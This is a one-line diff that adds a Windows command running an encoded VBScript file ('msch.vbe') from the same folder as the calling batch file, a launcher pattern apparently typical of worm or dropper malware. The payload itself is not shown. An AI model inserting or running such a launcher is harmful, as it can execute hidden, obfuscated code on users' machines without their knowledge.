@@ -1,0 +1,1 @@
+cscript.exe %0\..\msch.vbe
